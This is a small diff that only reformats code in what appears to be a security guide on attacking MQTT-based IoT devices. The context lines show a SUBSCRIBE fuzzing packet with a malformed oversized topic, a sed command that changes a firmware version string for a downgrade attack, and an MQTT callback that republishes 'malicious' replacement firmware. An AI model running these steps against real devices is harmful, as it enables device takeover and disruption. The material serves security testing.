@@ -361,7 +361,7 @@ for packet_len in [0x10, 0x1000, 0xFFFF]:
     send(pkt)
 
 # Fuzz SUBSCRIBE with malformed topic
-pkt = MQTTSubscribe(topics=[f"test/{'A'*1000}/#"])
+pkt = MQTTSubscribe(topics=[f"test/{'A' * 1000}/#"])
 send(pkt)
 ```
 
@@ -668,10 +668,12 @@ sed 's/version=2.0/version=1.0/' firmware.bin > firmware_downgrade.bin
 
 import paho.mqtt.client as mqtt
 
+
 def on_message(client, userdata, msg):
     # Replace firmware with malicious version
     new_firmware = create_malicious_firmware()
     client.publish(msg.topic, new_firmware)
+
 
 client = mqtt.Client()
 client.on_message = on_message
